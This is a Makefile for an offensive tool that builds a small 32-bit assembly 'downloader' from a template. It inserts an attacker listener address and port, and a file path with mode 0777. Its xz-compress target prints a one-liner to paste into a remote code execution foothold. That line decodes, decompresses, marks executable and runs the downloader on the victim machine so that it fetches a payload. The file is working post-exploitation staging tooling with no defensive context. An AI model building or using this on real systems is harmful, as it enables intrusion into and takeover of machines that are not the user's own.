LHOST = 127.0.0.1
LPORT = 4444
RMODE = 0o777

# Output filename can be specified as a command line argument, this is a default value
# needs to be escaped for our glorious templating engine sed(1)
RFILE = \/tmp\/file

lhost_bytes = $(shell python3 -c 'print("0x" + "".join(list(map(lambda x: "%02x" % x, map(int, "$(LHOST)".split(".")[::-1])))))')
lport_bytes = $(shell python3 -c 'import socket; print(hex(socket.htons($(LPORT))))')

all: downloader

downloader: downloader.o
	ld -m elf_i386 downloader.o -o downloader
	@echo Compiled and ready
	#mv ./downloader.asm.bck ./downloader.asm

downloader.o : templates downloader.asm
	nasm -f elf32 downloader.asm -o downloader.o

templates:
	cp downloader.asm.tpl downloader.asm
	sed -i 's/\^LHOST\^/$(lhost_bytes)/' ./downloader.asm
	sed -i 's/\^LPORT\^/$(lport_bytes)/' ./downloader.asm
	sed -i 's/\^RFILE\^/$(RFILE)/' ./downloader.asm
	sed -i 's/\^RMODE\^/$(RMODE)/' ./downloader.asm

xz-compress: downloader
	@echo "\n\n"
	@echo -----------------------------COPY THE FOLLOWING AND PASTE IT TO THE RCE-----------------------------
	@echo -n echo  $(shell xz -z -c -e ./downloader | base64 | tr -d '\n')
	@echo " | base64 -d | xz -d -c > downloader; chmod +x ./downloader && ./downloader"
	@echo ----------------------------------------------------------------------------------------------------

clean:
	$(RM) *.o
	$(RM) downloader

